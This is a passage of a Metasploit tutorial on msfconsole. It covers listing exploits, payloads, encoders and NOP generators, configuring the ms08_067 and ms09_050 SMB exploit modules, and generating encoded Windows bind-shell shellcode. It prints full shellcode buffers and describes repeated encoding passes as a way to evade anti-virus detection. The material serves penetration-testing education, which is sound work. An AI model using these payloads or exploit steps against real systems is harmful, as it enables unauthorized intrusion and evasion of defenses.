   aix/rpc_ttdbserverd_realpath                                   2009-06-17       great      ToolTalk rpc.ttdbserverd _tt_internal_realpath Buffer Overflow (AIX)
   bsdi/softcart/mercantec_softcart                               2004-08-19       great      Mercantec SoftCart CGI Overflow
 ...snip...


Using MSFconsole Payloads
^^^^^^

Running show payloads will display all of the different payloads for all platforms available within Metasploit.

::

 msf > show payloads

 Payloads
 ========

   Name                                             Disclosure Date  Rank    Description
   ----                                             ---------------  ----    -----------
   aix/ppc/shell_bind_tcp                                            normal  AIX Command Shell, Bind TCP Inline
   aix/ppc/shell_find_port                                           normal  AIX Command Shell, Find Port Inline
   aix/ppc/shell_interact                                            normal  AIX execve shell for inetd
 ...snip...

payloads
"""""

As you can see, there are a lot of payloads available. Fortunately, when you are in the context of a particular exploit, running show payloads will only display the payloads that are compatible with that particular exploit. For instance, if it is a Windows exploit, you will not be shown the Linux payloads.


::

 msf  exploit(ms08_067_netapi) > show payloads

 Compatible Payloads
 ===================

   Name                                             Disclosure Date  Rank    Description
   ----                                             ---------------  ----    -----------
   generic/custom                                                    normal  Custom Payload
   generic/debug_trap                                                normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                                            normal  Generic Command Shell, Bind TCP Inline
 ...snip...


options
"""""

If you have selected a specific module, you can issue the show options command to display which settings are available and/or required for that specific module.

::

  msf exploit(ms08_067_netapi) > show options

 Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

 Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


targets
"""""

If you aren’t certain whether an operating system is vulnerable to a particular exploit, run the show targets command from within the context of an exploit module to see which targets are supported.

::

 msf  exploit(ms08_067_netapi) > show targets

 Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   10  Windows 2003 SP1 Japanese (NO NX)
   11  Windows 2003 SP2 English (NO NX)
   12  Windows 2003 SP2 English (NX)
 ...snip...

advanced
"""""

If you wish the further fine-tune an exploit, you can see more advanced options by running show advanced.

::

  msf exploit(ms08_067_netapi) > show advanced

 Module advanced options:

   Name           : CHOST
   Current Setting:
   Description    : The local client address

   Name           : CPORT
   Current Setting:
   Description    : The local client port

 ...snip...

encoders
"""""

Running show encoders will display a listing of the encoders that are available within MSF.

::

  msf > show encoders
 Compatible Encoders
 ===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   cmd/generic_sh                           good       Generic Shell Variable Substitution Command Encoder
   cmd/ifs                                  low        Generic ${IFS} Substitution Command Encoder
   cmd/printf_php_mq                        manual     printf(1) via PHP magic_quotes Utility Command Encoder
   generic/none                             normal     The "none" Encoder
   mipsbe/longxor                           normal     XOR Encoder
   mipsle/longxor                           normal     XOR Encoder
   php/base64                               great      PHP Base64 encoder
   ppc/longxor                              normal     PPC LongXOR Encoder
   ppc/longxor_tag                          normal     PPC LongXOR Encoder
   sparc/longxor_tag                        normal     SPARC DWORD XOR Encoder
   x64/xor                                  normal     XOR Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder


nops
"""""

Lastly, issuing the show nops command will display the NOP Generators that Metasploit has to offer.

::

  msf > show nops
 NOP Generators
 ==============

   Name             Disclosure Date  Rank    Description
   ----             ---------------  ----    -----------
   armle/simple                      normal  Simple
   mipsbe/better                     normal  Better
   php/generic                       normal  PHP Nop Generator
   ppc/simple                        normal  Simple
   sparc/random                      normal  SPARC NOP Generator
   tty/generic                       normal  TTY Nop Generator
   x64/simple                        normal  Simple
   x86/opty2                         normal  Opty2
   x86/single_byte                   normal  Single Byte


use
"""""

When you have decided on a particular module to make use of, issue the use command to select it. The use command changes your context to a specific module, exposing type-specific commands. Notice in the output below that any global variables that were previously set are already configured.


::

  msf > use dos/windows/smb/ms09_001_write
 msf auxiliary(ms09_001_write) > show options

 Module options:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  445              yes       Set the SMB service port

 msf auxiliary(ms09_001_write) >


Exploits
=======

show Exploits

Selecting an exploit in Metasploit adds the ‘exploit’ and ‘check’ commands to msfconsole.

::

 msf > use  exploit/windows/smb/ms09_050_smb2_negotiate_func_index
 msf exploit(ms09_050_smb2_negotiate_func_index) > help
 ...snip...
 Exploit Commands
 ================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       Launch an exploit attempt
    pry           Open a Pry session on the current module
    rcheck        Reloads the module and checks if the target is vulnerable
    reload        Just reloads the module
    rerun         Alias for rexploit
    rexploit      Reloads the module and launches an exploit attempt
    run           Alias for exploit

 msf exploit(ms09_050_smb2_negotiate_func_index) >


show
^^^^

Using an exploit also adds more options to the ‘show’ command.

MSF Exploit Targets
"""""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show targets

 Exploit targets:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


MSF Exploit Payloads
""""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show payloads

 Compatible Payloads
 ===================

   Name                              Disclosure Date  Rank    Description
   ----                              ---------------  ----    -----------
   generic/custom                                     normal  Custom Payload
   generic/debug_trap                                 normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                             normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                          normal  Generic Command Shell, Reverse TCP Inline
   generic/tight_loop                                 normal  Generic x86 Tight Loop
   windows/adduser                                    normal  Windows Execute net user /ADD
 ...snip...

MSF Exploit Options
"""""""

::

  msf exploit(ms09_050_smb2_negotiate_func_index) > show options

 Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  445              yes       The target port (TCP)
   WAIT   180              yes       The number of seconds to wait for the attack to complete.


 Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


Advanced
""""""""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show advanced

 Module advanced options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name                    Current Setting    Required  Description
   ----                    ---------------    --------  -----------
   CHOST                                      no        The local client address
   CPORT                                      no        The local client port
   ConnectTimeout          10                 yes       Maximum number of seconds to establish a TCP connection
   ContextInformationFile                     no        The information file that contains context information
   DisablePayloadHandler   false              no        Disable the handler code for the selected payload
   EnableContextEncoding   false              no        Use transient context when encoding payloads
 ...snip...


Evasion
"""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show evasion
 Module evasion options:

   Name                           Current Setting  Required  Description
   ----                           ---------------  --------  -----------
   SMB::obscure_trans_pipe_level  0                yes       Obscure PIPE string in TransNamedPipe (level 0-3)
   SMB::pad_data_level            0                yes       Place extra padding between headers and data (level 0-3)
   SMB::pad_file_level            0                yes       Obscure path names used in open/create (level 0-3)
   SMB::pipe_evasion              false            yes       Enable segmented read/writes for SMB Pipes
   SMB::pipe_read_max_size        1024             yes       Maximum buffer size for pipe reads
   SMB::pipe_read_min_size        1                yes       Minimum buffer size for pipe reads
   SMB::pipe_write_max_size       1024             yes       Maximum buffer size for pipe writes
   SMB::pipe_write_min_size       1                yes       Minimum buffer size for pipe writes
   TCP::max_send_size             0                no        Maxiumum tcp segment size.  (0 = disable)
   TCP::send_delay                0                no        Delays inserted before every send.  (0 = disable)


payloads
=======

Payloads types
-------

We briefly covered the three main payload types: singles, stagers and stages. Metasploit contains many different types of payloads, each serving a unique role within the framework. Let’s take a brief look at the various types of payloads available and get an idea of when each type should be used.

Inline (Non Staged)
^^^^^^^^

A single payload containing the exploit and full shell code for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all in one. However some exploits wont support the resulting size of these payloads.

Stager
^^^^

Stager payloads work in conjunction with stage payloads in order to perform a specific task. A stager establishes a communication channel between the attacker and the victim and reads in a stage payload to execute on the remote host.

Meterpreter
^^^^^^^^

Meterpreter, the short form of Meta-Interpreter is an advanced, multi-faceted payload that operates via dll injection. The Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. Scripts and plugins can be loaded and unloaded dynamically as required and Meterpreter development is very strong and constantly evolving.

PassiveX
^^^^^^

PassiveX is a payload that can help in circumventing restrictive outbound firewalls. It does this by using an ActiveX control to create a hidden instance of Internet Explorer. Using the new ActiveX control, it communicates with the attacker via HTTP requests and responses.

NoNX
^^^^

The NX (No eXecute) bit is a feature built into some CPUs to prevent code from executing in certain areas of memory. In Windows, NX is implemented as Data Execution Prevention (DEP). The Metasploit NoNX payloads are designed to circumvent DEP.

Ord
^^^^

Ordinal payloads are Windows stager based payloads that have distinct advantages and disadvantages. The advantages being it works on every flavor and language of Windows dating back to Windows 9x without the explicit definition of a return address. They are also extremely tiny. However two very specific disadvantages make them not the default choice. The first being that it relies on the fact that ws2_32.dll is loaded in the process being exploited before exploitation. The second being that it’s a bit less stable than the other stagers.

IPv6
^^^^

The Metasploit IPv6 payloads, as the name indicates, are built to function over IPv6 networks.

Reflective DLL injection
^^^^^^

Reflective DLL Injection is a technique whereby a stage payload is injected into a compromised host process running in memory, never touching the host hard drive. The VNC and Meterpreter payloads both make use of reflective DLL injection. You can read more about this from Stephen Fewer, the creator of the reflective DLL injection method.
http://blog.harmonysecurity.com/2008/10/new-paper-reflective-dll-injection.html


Generating Payloads in Metasploit
------

General generation
^^^^^^

During exploit development, you will most certainly need to generate shellcode to use in your exploit. In Metasploit, payloads can be generated from within the msfconsole. When you ‘use‘ a certain payload, Metasploit adds the ‘generate‘, ‘pry‘ and ‘reload‘ commands. Generate will be the primary focus of this section in learning how to use Metasploit.

::

  msf > use payload/windows/shell_bind_tcp
 msf payload(shell_bind_tcp) > help
 ...snip...

    Command       Description
    -------       -----------
    generate      Generates a payload
    pry           Open a Pry session on the current module
    reload        Reload the current module from disk


Let’s start by looking at the various options for the ‘generate‘ command by running it with the ‘-h‘ switch.

::

  msf payload(shell_bind_tcp) > generate -h
 Usage: generate [options]

 Generates a payload.

 OPTIONS:

    -E        Force encoding.
    -b <opt>  The list of characters to avoid: '\x00\xff'
    -e <opt>  The name of the encoder module to use.
    -f <opt>  The output file name (otherwise stdout)
    -h        Help banner.
    -i <opt>  the number of encoding iterations.
    -k        Keep the template executable functional
    -o <opt>  A comma separated list of options in VAR=VAL format.
    -p <opt>  The Platform for output.
    -s <opt>  NOP sled length.
    -t <opt>  The output format: raw,ruby,rb,perl,pl,c,js_be,js_le,java,dll,exe,exe-small,elf,macho,vba,vbs,loop-vbs,asp,war
    -x <opt>  The executable template to use


To generate shellcode without any options, simply execute the ‘generate‘ command.

::

  msf payload(shell_bind_tcp) > generate
 # windows/shell_bind_tcp - 341 bytes
 # http://www.metasploit.com
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
 "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
 "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
 "\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" +
 "\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" +
 "\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" +
 "\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" +
 "\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" +
 "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" +
 "\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" +
 "\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f" +
 "\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29" +
 "\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50" +
 "\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7\x31" +
 "\xdb\x53\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68" +
 "\xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff" +
 "\xd5\x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x89\xc7" +
 "\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3" +
 "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44" +
 "\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56" +
 "\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86" +
 "\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60" +
 "\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5" +
 "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f" +
 "\x6a\x00\x53\xff\xd5"

Of course the odds of generating shellcode like this without any sort of ‘tweeking’ are rather low. More often than not, bad characters and specific types of encoders will be used depending on the targeted machine.

The sample code above contains an almost universal bad character, the null byte (\x00). Granted some exploits allow us to use it but not many. Let’s generate the same shellcode only this time we will instruct Metasploit to remove this unwanted byte.

To accomplish this, we issue the ‘generate‘ command followed by the ‘-b‘ switch with accompanying bytes we wish to be disallowed during the generation process.

::

  msf  payload(shell_bind_tcp) > generate -b '\x00'
 # windows/shell_bind_tcp - 368 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xdb\xde\xba\x99\x7c\x1b\x5f\xd9\x74\x24\xf4\x5e\x2b\xc9" +
 "\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\x8d\x9e\xee\xa3" +
 "\x45\xd7\x11\x5c\x95\x88\x98\xb9\xa4\x9a\xff\xca\x94\x2a" +
 "\x8b\x9f\x14\xc0\xd9\x0b\xaf\xa4\xf5\x3c\x18\x02\x20\x72" +
 "\x99\xa2\xec\xd8\x59\xa4\x90\x22\x8d\x06\xa8\xec\xc0\x47" +
 "\xed\x11\x2a\x15\xa6\x5e\x98\x8a\xc3\x23\x20\xaa\x03\x28" +
 "\x18\xd4\x26\
 ...snip...


Looking at this shellcode it’s easy to see, compared to the previously generated bind shell, the null bytes have been successfully removed. Thus giving us a null byte free payload. We also see other significant differences as well, due to the change we enforced during generation.

One difference is the shellcode’s total byte size. In our previous iteration the size was 341 bytes, this new shellcode is 27 bytes larger.

::

  msf  payload(shell_bind_tcp) > generate
 # windows/shell_bind_tcp - 341 bytes
 # http://www.metasploit.com
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 ...snip...

 msf  payload(shell_bind_tcp) > generate -b '\x00'
 # windows/shell_bind_tcp - 368 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 ...snip...

During generation, the null bytes’ original intent, or usefulness in the code, needed to be replaced (or encoded) in order to insure, once in memory, our bind shell remains functional.

Another significant change is the added use of an encoder. By default Metasploit will select the best encoder to accomplish the task at hand. The encoder is responsible for removing unwanted characters (amongst other things) entered when using the ‘-b’ switch. We’ll discuss encoders in greater detail later on.

When specifying bad characters the framework will use the best encoder for the job. The ‘x86/shikata_ga_nai’ encoder was used when only the null byte was restricted during the code’s generation. If we add a few more bad characters a different encoder may be used to accomplish the same task. Lets add several more bytes to the list and see what happens.

::

  msf  payload(shell_bind_tcp) > generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b'
 # windows/shell_bind_tcp - 366 bytes
 # http://www.metasploit.com
 # Encoder: x86/fnstenv_mov
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\x6a\x56\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xbf" +
 "\x5c\xbf\xe8\x83\xeb\xfc\...
 ...snip...


We see a different encoder was used in order to successfully remove our unwanted bytes. Shikata_ga_nai was probably incapable of encoding our payload using our restricted byte list. Fnstenv_mov on the other hand was able to accomplish this.


Payload Generation Failed
^^^^^^^^^^^^

Having the ability to generate shellcode without the use of certain characters is one of the great features offered by this framework. That doesn’t mean it’s limitless.

 If too many restricted bytes are given no encoder may be up for the task. At which point Metasploit will display the following message.

 ::

   msf  payload(shell_bind_tcp) > generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26'
 [-] Payload generation failed: No encoders encoded the buffer successfully.


It’s like removing too may letters from the alphabet and asking someone to write a full sentence. Sometimes it just can’t be done.

Using an Encoder During Payload Generation
^^^^^^

As mentioned previously the framework will choose the best encoder possible when generating our payload. However there are times when one needs to use a specific type, regardless of what Metasploit thinks. Imagine an exploit that will only successfully execute provided it only contains non-alphanumeric characters. The ‘shikata_ga_nai’ encoder would not be appropriate in this case as it uses pretty much every character available to encode.

 Looking at the encoder list, we see the ‘x86/nonalpha’ encoder is present.

 ::

   msf  payload(shell_bind_tcp) > show encoders

 Encoders
 ========

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
 ...snip...
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder


Let’s redo our bind shell payload but this time we’ll tell the framework to use the ‘nonalpha‘ encoder. We do this by using the ‘-e‘ switch followed by the encoder’s name as displayed in the above list.

::

  msf  payload(shell_bind_tcp) > generate -e x86/nonalpha
 # windows/shell_bind_tcp - 489 bytes
 # http://www.metasploit.com
 # Encoder: x86/nonalpha
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\x66\xb9\xff\xff\xeb\x19\x5e\x8b\xfe\x83\xc7\x70\x8b\xd7" +
 "\x3b\xf2\x7d\x0b\xb0\x7b\xf2\xae\xff\xcf\xac\x28\x07\xeb" +
 "\xf1\xeb\x75\xe8\xe2\xff\xff\xff\x17\x29\x29\x29\x09\x31" +
 "\x1a\x29\x24\x29\x39\x03\x07\x31\x2b\x33\x23\x32\x06\x06" +
 "\x23\x23\x15\x30\x23\x37\x1a\x22\x21\x2a\x23\x21\x13\x13" +
 "\x04\x08\x27\x13\x2f\x04\x27\x2b\x13\x10\x2b\x2b\x2b\x2b" +
 "\x2b\x2b\x13\x28\x13\x11\x25\x24\x13\x14\x28\x24\x13\x28" +
 "\x28\x24\x13\x07\x24\x13\x06\x0d\x2e\x1a\x13\x18\x0e\x17" +
 "\x24\x24\x24\x11\x22\x25\x15\x37\x37\x37\x27\x2b\x25\x25" +
 "\x25\x35\x25\x2d\x25\x25\x28\x25\x13\x02\x2d\x25\x35\x13" +
 "\x25\x13\x06\x34\x09\x0c\x11\x28\xfc\xe8\x89\x00\x00\x00" +
 ...snip...


If everything went according to plan, our payload will not contain any alphanumeric characters. But we must be careful when using a different encoder other than the default. As it tends to give us a larger payload. For instance, this one is much larger than our previous examples.

Our next option on the list is the ‘-f‘ switch. This gives us the ability to save our generated payload to a file instead of displaying it on the screen. As always it follows the ‘generate‘ command with file path.

::

  msf  payload(shell_bind_tcp) > generate -b '\x00' -e x86/shikata_ga_nai -f /root/msfu/filename.txt
 [*] Writing 1803 bytes to /root/msfu/filename.txt...
 msf  payload(shell_bind_tcp) > cat ~/msfu/filename.txt
 [*] exec: cat ~/msfu/filename.txt

 # windows/shell_bind_tcp - 368 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xdb\xcb\xb8\x4f\xd9\x99\x0f\xd9\x74\x24\xf4\x5a\x2b\xc9" +
 "\xb1\x56\x31\x42\x18\x83\xc2\x04\x03\x42\x5b\x3b\x6c\xf3" +
 "\x8b\x32\x8f\x0c\x4b\x25\x19\xe9\x7a\x77\x7d\x79\x2e\x47" +
 "\xf5\x2f\xc2\x2c\x5b\xc4\x51\x40\x74\xeb\xd2\xef\xa2\xc2" +
 "\xe3\xc1\x6a\x88\x27\x43\x17\xd3\x7b\xa3\x26\x1c\x8e\xa2" +
 "\x6f\x41\x60\xf6\x38\x0d\xd2\xe7\x4d\x53\xee\x06\x82\xdf" +
 "\x4e\x71\xa7\x20\x3a\xcb\xa6\x70\x92\x40\xe0\x68\x99\x0f" +
 "\xd1\x89\x4e\x4c\x2d\xc3\xfb\xa7\xc5\xd2\x2d\xf6\x26\xe5" +
 ...snip...


By using the ‘cat‘ command the same way we would from the command shell, we can see our payload was successfully saved to our file. As we can see it is also possible to use more than one option when generating our shellcode.


Generating Payloads with Multiple Passes
^^^^

Next on our list of options is the iteration switch ‘-i‘. In a nutshell, this tells the framework how many encoding passes it must do before producing the final payload. One reason for doing this would be stealth, or anti-virus evasion. Anti-virus evasion is covered in greater detail in another section of MSFU.

So let’s compare our bind shell payload generated using 1 iteration versus 2 iteration of the same shellcode.

::

  msf  payload(shell_bind_tcp) > generate -b '\x00'
 # windows/shell_bind_tcp - 368 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xdb\xd9\xb8\x41\x07\x94\x72\xd9\x74\x24\xf4\x5b\x2b\xc9" +
 "\xb1\x56\x31\x43\x18\x03\x43\x18\x83\xeb\xbd\xe5\x61\x8e" +
 "\xd5\x63\x89\x6f\x25\x14\x03\x8a\x14\x06\x77\xde\x04\x96" +
 "\xf3\xb2\xa4\x5d\x51\x27\x3f\x13\x7e\x48\x88\x9e\x58\x67" +
 "\x09\x2f\x65\x2b\xc9\x31\x19\x36\x1d\x92\x20\xf9\x50\xd3" +
 "\x65\xe4\x9a\x81\x3e\x62\x08\x36\x4a\x36\x90\x37\x9c\x3c" +
 ...snip...

With two iterations :

::

  msf  payload(shell_bind_tcp) > generate -b '\x00' -i 2
 # windows/shell_bind_tcp - 395 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xbd\xea\x95\xc9\x5b\xda\xcd\xd9\x74\x24\xf4\x5f\x31\xc9" +
 "\xb1\x5d\x31\x6f\x12\x83\xc7\x04\x03\x85\x9b\x2b\xae\x80" +
 "\x52\x72\x25\x16\x6f\x3d\x73\x9c\x0b\x38\x26\x11\xdd\xf4" +
 "\x80\xd2\x1f\xf2\x1d\x96\x8b\xf8\x1f\xb7\x9c\x8f\x65\x96" +
 "\xf9\x15\x99\x69\x57\x18\x7b\x09\x1c\xbc\xe6\xb9\xc5\xde" +
 "\xc1\x81\xe7\xb8\xdc\x3a\x51\xaa\x34\xc0\x82\x7d\x6e\x45" +
 "\xeb\x2b\x27\x08\x79\xfe\x8d\xe3\x2a\xed\x14\xe7\x46\x45" +
 ...snip...


Comparing the two outputs we see the obvious effect the second iteration had on our payload. First of all, the byte size is larger than the first. The more iterations one does the larger our payload will be. Secondly comparing the first few bytes of the highlighted code, we also see they are no longer the same. This is due to the second iteration, or second encoding pass. It encoded our payload once, than took that payload and encoded it again. Lets look at our shellcode and see how much of a difference 5 iterations would make.


::

  msf  payload(shell_bind_tcp) > generate -b '\x00' -i 5
 # windows/shell_bind_tcp - 476 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xb8\xea\x18\x9b\x0b\xda\xc4\xd9\x74\x24\xf4\x5b\x33\xc9" +
 "\xb1\x71\x31\x43\x13\x83\xeb\xfc\x03\x43\xe5\xfa\x6e\xd2" +
 "\x31\x23\xe4\xc1\x35\x8f\x36\xc3\x0f\x94\x11\x23\x54\x64" +
 "\x0b\xf2\xf9\x9f\x4f\x1f\x01\x9c\x1c\xf5\xbf\x7e\xe8\xc5" +
 "\x94\xd1\xbf\xbb\x96\x64\xef\xc1\x10\x9e\x38\x45\x1b\x65" +
 ...snip...


The change is significant when comparing to all previous outputs. It’s slightly larger and our bytes are no where near similar. Which would, in theory, make this version of our payload less prone to detection.

We’ve spent lots of time generating shellcode from the start with default values. In the case of a bind shell the default listening port is 4444. Often this must be changed. We can accomplish this by using the ‘-o’ switch followed by the value we wish to change. Let’s take a look at which options we can change for this payload. From the msfconsole we’ll issue the ‘show options’ command.

::

  msf  payload(shell_bind_tcp) > show options

 Module options (payload/windows/shell_bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
   LPORT     4444             yes       The listen port
   RHOST                      no        The target address


By default our shell will listen on port ‘4444’ and the exit function is ‘process’. We’ll change this to port ‘1234’ and ‘seh’ exit function using the ‘-o’. The syntax is VARIABLE=VALUE separated by a comma between each option. In this case both the listening port and exit function are changed so the following syntax is used ‘LPORT=1234,EXITFUNC=seh’.


::

  msf  payload(shell_bind_tcp) > generate -o LPORT=1234,EXITFUNC=seh -b '\x00' -e x86/shikata_ga_nai
 # windows/shell_bind_tcp - 368 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=1234, RHOST=, EXITFUNC=seh,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xdb\xd1\xd9\x74\x24\xf4\xbb\x93\x49\x9d\x3b\x5a\x29\xc9" +
 "\xb1\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x87\xab\x68\xc7" +
 "\x4f\xa2\x93\x38\x8f\xd5\x1a\xdd\xbe\xc7\x79\x95\x92\xd7" +
 "\x0a\xfb\x1e\x93\x5f\xe8\x95\xd1\x77\x1f\x1e\x5f\xae\x2e" +
 "\x9f\x51\x6e\xfc\x63\xf3\x12\xff\xb7\xd3\x2b\x30\xca\x12" +
 "\x6b\x2d\x24\x46\x24\x39\x96\x77\x41\x7f\x2a\x79\x85\x0b" +
 "\x12\x01\xa0\xcc\xe6\xbb\xab\x1c\x56\xb7\xe4\x84\xdd\x9f" +
 ...snip...


Payload Generation Using a NOP Sled
^^^^


Finally lets take a look at the NOP sled length and output format options. When generating payloads the default output format given is ‘ruby’. Although the ruby language is extremely powerful and popular, not everyone codes in it. We have the capacity to tell the framework to give our payload in different coding formats such as Perl, C and Java for example. Adding a NOP sled at the beginning is also possible when generating our shellcode.

First let’s look at a few different output formats and see how the ‘-t‘ switch is used. Like all the other options all that needs to be done is type in the switch followed by the format name as displayed in the help menu.

::

  msf  payload(shell_bind_tcp) > generate
 # windows/shell_bind_tcp - 341 bytes
 # http://www.metasploit.com
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
